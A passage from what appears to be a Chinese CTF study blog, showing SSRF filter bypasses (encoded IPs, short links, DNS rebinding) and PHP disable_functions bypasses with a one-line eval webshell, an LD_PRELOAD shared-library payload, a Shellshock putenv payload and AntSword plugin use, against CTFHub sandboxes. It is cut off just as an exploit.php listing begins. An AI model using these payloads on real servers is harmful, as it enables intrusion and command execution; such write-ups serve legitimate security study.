<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.com</span><br><span class="line">①②⑦.⓿.⓿.①  &gt;&gt;&gt; 127.0.0.1</span><br></pre></td></tr></table></figure>
<ul>
<li>特殊地址</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://0/  # 0.0.0.0可以直接访问到本地</span><br><span class="line">http://127。0。0。1  # 绕过后端正则规则</span><br><span class="line">http://localhost/</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这次ban掉了127以及172，不能使用点分十进制的IP了。但是又要访问127.0.0.1。该怎么办呢 </p>
</blockquote>
<p>首先看看<a target="_blank" rel="noopener" href="http://challenge-36ebaf025673bdcd.sandbox.ctfhub.com:10800/?url=http://127.0.0.1/flag.php">http://challenge-36ebaf025673bdcd.sandbox.ctfhub.com:10800/?url=http://127.0.0.1/flag.php</a></p>
<blockquote>
<p>hacker! Ban ‘/127|172|@/‘</p>
</blockquote>
<p>说过滤了127，172还有@，经过验证， 以下url值也都可以绕过爆出flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://0x7f000001/flag.php</span><br><span class="line">http://localhost/flag.php</span><br><span class="line">http://2130706433/flag.php</span><br><span class="line">http://0/flag.php</span><br><span class="line">http://localhost/flag.php</span><br></pre></td></tr></table></figure>
<h2 id="16-9-302跳转-Bypass"><a href="#16-9-302跳转-Bypass" class="headerlink" title="16.9 302跳转 Bypass"></a>16.9 302跳转 Bypass</h2><p>如果后端服务器在接收到参数后，正确的解析了URL的host，并且进行了过滤，这个时候可以尝试使用302跳转的方式来进行绕过。</p>
<p><strong>xip.io</strong></p>
<p>What is xip.io?<br>xip.io is a magic domain name that provides wildcard DNS<br>for any IP address. Say your LAN IP address is 10.0.0.1.<br>Using xip.io,即以如下规则进行域名解析</p>
<pre><code>10.0.0.1.xip.io   resolves to   10.0.0.1
www.10.0.0.1.xip.io   resolves to   10.0.0.1
mysite.10.0.0.1.xip.io   resolves to   10.0.0.1
foo.bar.10.0.0.1.xip.io resolves to 10.0.0.1
</code></pre><p><strong>短网址</strong></p>
<p>顾名思义就是在形式上比较短的网址，借助短网址您可以用简短的网址替代原来冗长的网址，让使用者可以更容易的分享链接。</p>
<p>访问短网址会自动跳转到原来冗长的网址，利用短网址这个特性，我们可以绕过URL参数检测的黑名单。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 短网址工具域名： https://www.985.so/</span><br><span class="line">http://127.0.0.1/flag.php ---&gt; http://r6d.cn/b2mk6</span><br></pre></td></tr></table></figure>
<blockquote>
<p>SSRF中有个很重要的一点是请求可能会跟随302跳转，尝试利用这个来绕过对IP的检测访问到位于127.0.0.1的flag.php吧。</p>
</blockquote>
<p>依旧尝试一下<a target="_blank" rel="noopener" href="http://challenge-5b889e8b9c4e4f67.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php">http://challenge-5b889e8b9c4e4f67.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php</a></p>
<blockquote>
<p> hacker! Ban Intranet IP </p>
</blockquote>
<p>它说把<code>127.0.0.1</code>都给过滤了，所以用<code>.xip.io</code>不行，但用短网址与10.8的某些地址就可以轻松绕过。</p>
<h2 id="16-10-DNS重绑定攻击"><a href="#16-10-DNS重绑定攻击" class="headerlink" title="16.10 DNS重绑定攻击"></a>16.10 DNS重绑定攻击</h2>
<p>根据流程图：对于用户请求的URL参数，首先服务器端会对其进行DNS解析，然后对于DNS服务器返回的IP地址进行判断，如果在黑名单中，就pass掉。</p>
<p>但是在整个过程中，第一次去请求DNS服务进行域名解析到第二次服务端去请求URL之间存在一个时间差，利用这个时间差，我们可以进行DNS 重绑定攻击。我们利用DNS Rebinding技术，在第一次校验IP的时候返回一个合法的IP，在真实发起请求的时候，返回我们真正想要访问的内网IP即可。</p>
<p>要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，设置TTL（TTL表示DNS记录在DNS服务器上缓存时间）时间为0，这是为了防止有DNS服务器对第一次的解析结果进行缓存。</p>
<p>完整的DNS重绑定攻击流程为：</p>
<ol>
<li>服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP</li>
<li>对于获得的IP进行判断，发现为指定范围IP，则通过验证</li>
<li>接下来服务器端对URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址</li>
<li>由于已经绕过验证，所以服务器端返回访问内网资源的内容</li>
</ol>
<p>设置好两个地址，就会自动生成域名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 工具域名： https://lock.cmpxchg8b.com/rebinder.html</span><br><span class="line"># 使用两个IP地址，分别为</span><br><span class="line">163.177.151.109 # 作用：第一次DNS解析后IP判断在指定范围内（随意一个可访问的公网地址）</span><br><span class="line">127.0.0.1       # 作用：第二次DNS解析，不用判断直接访问内网flag.php</span><br><span class="line"></span><br><span class="line">7f000001.a3b1976d.rbndr.us</span><br></pre></td></tr></table></figure>
<p>抓包，将url改为域名，就得flag。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /?url=7f000001.a3b1976d.rbndr.us/flag.php HTTP/1.1</span><br></pre></td></tr></table></figure>
<h1 id="17-Bypass-disable-function"><a href="#17-Bypass-disable-function" class="headerlink" title="17.  Bypass disable_function"></a>17.  Bypass disable_function</h1><p>PHP 的 disabled_functions主要是用于禁用一些危险的函数防止被一些攻击者利用。有四种绕过 disable_functions 的手法：</p>
<ul>
<li>攻击后端组件，寻找存在命令注入的 web 应用常用的后端组件，如ImageMagick 的魔图漏洞、bash 的破壳漏洞等等；</li>
<li>寻找未禁用的漏网函数，常见的执行命令的函数有 system()、exec()、shell_exec()、passthru()，偏僻的popen()、proc_open()、pcntl_exec()，逐一尝试，或许有漏网之鱼；</li>
<li>mod_cgi 模式，尝试修改 .htaccess，调整请求访问路由，绕过 php.ini 中的任何限制（让特定扩展名的文件直接和php-cgi通信）；</li>
<li>利用环境变量 LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果。</li>
</ul>
<p>在学习php时，发现有许多函数会对网站或系统造成很大危险隐患，常见的危险函数有：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">phpinfo</span>()</span><br><span class="line">功能描述：输出 PHP 环境信息以及相关的模块、WEB 环境等信息。</span><br><span class="line">危险等级：中</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">passthru</span>()</span><br><span class="line">功能描述：允许执行一个外部程序并回显输出，类似于 <span class="title function_ invoke__">exec</span>()。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">exec</span>()</span><br><span class="line">功能描述：允许执行一个外部程序（如 UNIX Shell 或 CMD 命令等）。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">system</span>()</span><br><span class="line">功能描述：允许执行一个外部程序并回显输出，类似于 <span class="title function_ invoke__">passthru</span>()。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chroot</span>()</span><br><span class="line">功能描述：可改变当前 PHP 进程的工作根目录，仅当系统支持 CLI 模式</span><br><span class="line">PHP 时才能工作，且该函数不适用于 Windows 系统。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">scandir</span>()</span><br><span class="line">功能描述：列出指定路径中的文件和目录。</span><br><span class="line">危险等级：中</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chgrp</span>()</span><br><span class="line">功能描述：改变文件或目录所属的用户组。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chown</span>()</span><br><span class="line">功能描述：改变文件或目录的所有者。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>()</span><br><span class="line">功能描述：通过 Shell 执行命令，并将执行结果作为字符串返回。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">proc_open</span>()</span><br><span class="line">功能描述：执行一个命令并打开文件指针用于读取以及写入。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">proc_get_status</span>()</span><br><span class="line">功能描述：获取使用 <span class="title function_ invoke__">proc_open</span>() 所打开进程的信息。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_log</span>()</span><br><span class="line">功能描述：将错误信息发送到指定位置（文件）。</span><br><span class="line">安全备注：在某些版本的 PHP 中，可使用 <span class="title function_ invoke__">error_log</span>() 绕过 PHP safe mode，</span><br><span class="line">执行任意命令。</span><br><span class="line">危险等级：低</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_alter</span>()</span><br><span class="line">功能描述：是 <span class="title function_ invoke__">ini_set</span>() 函数的一个别名函数，功能与 <span class="title function_ invoke__">ini_set</span>() 相同。</span><br><span class="line">具体参见 <span class="title function_ invoke__">ini_set</span>()。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>()</span><br><span class="line">功能描述：可用于修改、设置 PHP 环境配置参数。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_restore</span>()</span><br><span class="line">功能描述：可用于恢复 PHP 环境配置参数到其初始值。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">dl</span>()</span><br><span class="line">功能描述：在 PHP 进行运行过程当中（而非启动时）加载一个 PHP 外部模块。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">pfsockopen</span>()</span><br><span class="line">功能描述：建立一个 Internet 或 UNIX 域的 socket 持久连接。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">syslog</span>()</span><br><span class="line">功能描述：可调用 UNIX 系统的系统层 <span class="title function_ invoke__">syslog</span>() 函数。</span><br><span class="line">危险等级：中</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">readlink</span>()</span><br><span class="line">功能描述：返回符号连接指向的目标文件内容。</span><br><span class="line">危险等级：中</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">symlink</span>()</span><br><span class="line">功能描述：在 UNIX 系统中建立一个符号链接。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">popen</span>()</span><br><span class="line">功能描述：可通过 <span class="title function_ invoke__">popen</span>() 的参数传递一条命令，并对 <span class="title function_ invoke__">popen</span>() 所打开的文件进行执行。</span><br><span class="line">危险等级：高</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">stream_socket_server</span>()</span><br><span class="line">功能描述：建立一个 Internet 或 UNIX 服务器连接。</span><br><span class="line">危险等级：中</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">putenv</span>()</span><br><span class="line">功能描述：用于在 PHP 运行时改变系统字符集环境。在低于 <span class="number">5.2</span>.<span class="number">6</span> 版本的 PHP 中，可利用该函数修改系统字符集环境后，利用 sendmail 指令发送特殊参数执行系统 SHELL 命令。</span><br><span class="line">危险等级：高</span><br></pre></td></tr></table></figure>
<h2 id="17-1-LD-PRLOAD"><a href="#17-1-LD-PRLOAD" class="headerlink" title="17.1 LD_PRLOAD"></a>17.1 LD_PRLOAD</h2><p>LD_PRELOAD可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。<strong>通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。</strong>一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入恶意程序，从而达到那不可告人的罪恶的目的。</p>
<blockquote>
<p>我们知道，Linux的用的都是glibc，有一个叫libc.so.6的文件，这是几乎所有Linux下命令的动态链接中，其中有标准C的各种函数。对于GCC而言，默认情况下，所编译的程序中对标准C函数的链接，都是通过动态链接方式来链接libc.so.6这个函数库的。</p>
</blockquote>
<p>程序中我们经常要调用一些外部库的函数，以sendmail程序中的geteuid()为例，如果我们有个自定义的geteuid()函数，把它编译成动态库后，通过LD_PRELOAD加载，当程序中调用geteuid()函数时，调用的其实是我们自定义的geteuid()函数。而在PHP中error_log()和mail()函数在传入特定参数时都会调用到sendmail外部程序进而调用外部库的函数geteuid()。</p>
<p>所以我们的思路是：在已获得webshell但被PHP的disable_function禁用了一些危险函数的命令执行的情况下</p>
<ol>
<li>编写好动态链接库文件并上传到服务器</li>
<li>编写PHP文件并上传到服务器，内容为：<br>利用putenv设置LD_PRELOAD为我们的恶意动态链接库文件的路径，然后 配合php的某个函数（例如error_log()或mail()函数）去触发运行动态链接库然后执行我们的恶意动态链接库文件</li>
<li>在浏览器去浏览我们写的PHP文件</li>
</ol>
<p>例：hcfhub-web进阶-Bypass disable_function-LD_PRLOAD</p>
<p>打开链接页面显示</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">CTFHub Bypass disable_function —— LD_PRELOAD</span><br><span class="line">本环境来源于AntSword-Labs</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;CTFHub Bypass disable_function —— LD_PRELOAD&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;CTFHub Bypass disable_function —— LD_PRELOAD&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;本环境来源于&lt;a href=&quot;https://github.com/AntSwordProject/AntSword-Labs&quot;&gt;AntSword-Labs&lt;/a&gt;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">@eval($_REQUEST[&#x27;ant&#x27;]);</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>即在本页面上就放了一句话木马，用蚁剑连接。在根目录发现flag，但打开是空白页面，终端命令执行也不行。还有一个readflag，打开发现是执行显示flag的命令<code>tac /flag</code>，终端执行也不行。</p>
<blockquote>
<p>tac命令与cat命令展示内容相反，用于将文件<strong>以行为单位</strong>的反序输出，即第一行最后显示，最后一行先显示，且不能带行输出。 </p>
</blockquote>
<p>方法一：用蚁剑插件的LD_PRLOAD模式</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/hxhxhxhxx/article/details/112759999?utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.essearch_pc_relevant&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.essearch_pc_relevant">https://blog.csdn.net/hxhxhxhxx/article/details/112759999?utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.essearch_pc_relevant&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-1.essearch_pc_relevant</a></p>
<p>方法二：手工绕过</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//查看禁用了哪些函数</span><br><span class="line">http://challenge-f10324543e937194.sandbox.ctfhub.com:10800/?ant=phpinfo();</span><br></pre></td></tr></table></figure>
<p>发现禁用了mail函数，但没禁用error_log()。所以下面利用error_log()绕过LD_PRLOAD。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_log</span>()函数向服务器错误记录、文件或远程目标发送错误信息。</span><br><span class="line"><span class="title function_ invoke__">error_log</span>(message,type,destination,headers);</span><br></pre></td></tr></table></figure>
<p>先创建一个havefun.c文件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>        </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">payload</span><span class="params">()</span>&#123;</span><br><span class="line">	system(<span class="string">&quot;/readflag &gt; /tmp/havefun&quot;</span>);</span><br><span class="line">    <span class="comment">//如果/readflag运行成功将会在/tmp目录下生成一个havefun文件</span></span><br><span class="line">    <span class="comment">//system(&quot;tac /flag &gt; /tmp/havefun&quot;);</span></span><br><span class="line">&#125;   </span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">geteuid</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译成havefun.so文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared havefun.c -o havefun.so</span><br></pre></td></tr></table></figure>
<p>将havefun.so文件拖入/tmp目录下，创建一个havefun.php拖入/var/www/html目录下。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD_PRELOAD=/tmp/havefun.so&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_log</span>(<span class="string">&quot;&quot;</span>,<span class="number">1</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="comment">//mail(&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//因为mail()函数不能用，所以用函数error_log()</span></span><br></pre></td></tr></table></figure>
<p>现在所有的前提工作都做好了，关键是怎么执行havefun.php让它执行havefun.so再执行/readflag命令。很简单，主页面不是有一个$_REQUEST[‘ant’]吗，我们可以利用文件包含，将havefun.php文件包含在主页面，执行主页面就可执行havefun.php。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-f10324543e937194.sandbox.ctfhub.com:10800/?ant=include(&#x27;havefun.php&#x27;);</span><br></pre></td></tr></table></figure>
<p>执行完后会在/tmp目录下生成一个havefun文件，打开就是flag。</p>
<h2 id="17-2-ShellShock"><a href="#17-2-ShellShock" class="headerlink" title="17.2 ShellShock"></a>17.2 ShellShock</h2><p>例：hcfhub-web进阶-Bypass disable_function-ShellShock</p>
<p>跟LD_PRLOAD一样的界面，用蚁剑连接即可。发现什么目录都不给我们看，只能看/var/www/html的目录。</p>
<p>方法一：用蚁剑插件的apache_mode_cgi模式</p>
<p>点击开始，自动弹出终端。查找flag。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/readflag</span><br><span class="line">tac /flag</span><br></pre></td></tr></table></figure>
<p>方法二：手工shellshock</p>
<p>创建一个shell.php文件上传到/var/www/html</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;PHP_hack=() &#123; :; &#125;; tac /flag &gt; /var/www/html/hack.php&quot;</span>);</span><br><span class="line"><span class="comment">//运行成功的话将会在/var/www/html下生成一个hack.php文件，里面装着flag。因为我们只能看到/var/www/html目录下的东西，所以只能把flag放在这个路径下。</span></span><br><span class="line"><span class="title function_ invoke__">error_log</span>(<span class="string">&quot;&quot;</span>,<span class="number">1</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="comment">//mail(&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);</span></span><br><span class="line"><span class="comment">//这次没有限制禁用mail(),所以用mail()也可。</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>执行shell.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-6a758e43b272dbba.sandbox.ctfhub.com:10800/shell.php</span><br></pre></td></tr></table></figure>
<p>发现/var/www/htm目录下会生成一个hack.php。</p>
<h2 id="17-3-Apache-Mod-CGI"><a href="#17-3-Apache-Mod-CGI" class="headerlink" title="17.3 Apache Mod CGI"></a>17.3 Apache Mod CGI</h2><p>CGI简单说来便是放在服务器上的可执行程序,CGI编程没有特定的语言,C语言,linux shell,perl,vb等等都可以进行CGI编程。</p>
<p>MOD_CGI：任何具有MIME类型application/x-httpd-cgi或者被cgi-script处理器处理的文件都将被作为CGI脚本对待并由服务器运行，它的输出将被返回给客户端。可以通过两种途径使文件成为CGI脚本，一种是文件具有已由AddType指令定义的扩展名，另一种是文件位于ScriptAlias目录中。</p>
<p>例：hcfhub-web进阶-Bypass disable_function-Apache Mod CGI</p>
<p>这个好像只能用插件？跟shellshock套路一样。</p>
<h2 id="17-4-PHP-FPM"><a href="#17-4-PHP-FPM" class="headerlink" title="17.4 PHP-FPM"></a>17.4 PHP-FPM</h2><blockquote>
<p>由于FPM默认监听的是9000端口,我们就可以绕过webserver,直接构造fastcgi协议，和fpm进行通信.于是就有了利用 webshell 直接与 FPM通信 来绕过 disable functions.<br>因为前面我们了解了协议原理和内容,接下来就是使用cgi协议封装请求,通过socket来直接与FPM通信<br>但是能够构造fastcgi，就能执行任意PHP代码吗?答案是肯定的,但是前提是我们需要突破几个限制：</p>
<ol>
<li>第一个问题<br>既然是请求,那么SCRIPT_FILENAME就相当的重要,因为前面说过,fpm是根据这个值来执行php文件文件的,如果不存在,会直接返回404,所以想要利用好这个漏洞,就得找到一个已经存在的php文件,好在一般进行源安装php的时候,服务器都会附带上一些php文件,如果说我们没有收集到目标web目录的信息的话,可以试试这种办法.</li>
<li>第二个问题<br>我们再如何构造fastcgi和控制SCRIPT_FILENAME,都无法做到任意命令执行,因为只能执行目标服务器上的php文件.<br>那要如何绕过这种限制呢? 我们可以从php.ini入手.它有两个特殊选项,能够让我们去做到任意命令执行,那就是auto_prepend_file<br>auto_prepend_file的功能是在在执行目标文件之前，先包含它指定的文件,这样的话,就可以用它来指定php://input进行远程文件包含了.这样就可以做到任意命令执行了.</li>
<li>第三个问题<br>进行过远程文件包含的小伙伴都知道,远程文件包含有allow_url_include这个限制因素的,如果没有为ON的话就没有办法进行远程文件包含,那要怎末设置呢?<br>FPM是有设置PHP配置项的KEY-VALUE的,PHP_VALUE可以用来设置php.ini,PHP_ADMIN_VALUE则可以设置所有选项.这样就解决问题了。</li>
</ol>
</blockquote>
<p>例：hcfhub-web进阶-Bypass disable_function-PHP-FPM</p>
<p>一样用蚁剑连接，用蚁剑插件fastcgi/php-fpm，地址选择本地的9000端口，点击开始，就会在/var/www/html下生成一个.antproxy.php文件，在蚁剑添加数据，路径加上.antproxy.php，连接成功就可找flag。</p>
<h2 id="17-5-GC-UAF"><a href="#17-5-GC-UAF" class="headerlink" title="17.5 GC UAF"></a>17.5 GC UAF</h2><p>方法一：蚁剑插件PHP_GC_UAF</p>
<p>方法二：一样用蚁剑连接，将编写好的exploit.php上传到/var/www/html上。</p>
<p>编写脚本exploit.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span 